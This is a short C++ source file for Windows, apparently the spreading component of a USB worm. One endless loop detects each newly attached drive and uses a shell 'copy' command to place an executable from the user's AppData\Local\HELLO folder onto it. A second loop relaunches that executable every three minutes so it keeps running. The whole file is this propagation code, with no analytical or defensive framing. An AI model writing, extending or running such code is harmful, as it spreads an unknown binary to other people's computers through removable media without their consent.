#include <stdio.h>
#include <time.h>
#include <windows.h>
#include <string>
#include <thread>
#include <future>
using namespace std;

string allDrives;
char getRemovableDisk();
char driveLetter = getRemovableDisk();
void new_device(){
    for(;;) {
        driveLetter = getRemovableDisk();
        string tmp {(string)"copy \"C:\\Users\\%USERNAME%\\AppData\\Local\\HELLO\\main.exe\" "+driveLetter+":\\"};
        if (driveLetter != '0') {
            system(tmp.c_str());
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}
void notification(){
    for(;;) {
        system("start C:\\Users\\%USERNAME%\\AppData\\Local\\HELLO\\main.exe");
        std::this_thread::sleep_for(180s);
    }
}
int main(void) {
    auto future1 = std::async(notification);
    auto future2 = std::async(new_device);
    return 0;
}

char getRemovableDisk() {
    char drive = '0';

    char szLogicalDrives[MAX_PATH];
    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);

    string currentDrives = "";

    //cout << dwResult << endl;
    for (int i = 0; i < dwResult; i++) {
        if (szLogicalDrives[i] > 64 && szLogicalDrives[i] < 90) {
            currentDrives.append(1, szLogicalDrives[i]);
            if (allDrives.find(szLogicalDrives[i]) > 100) {
                drive = szLogicalDrives[i];
            }
            

        }
    }

    allDrives = currentDrives;

    return drive;
}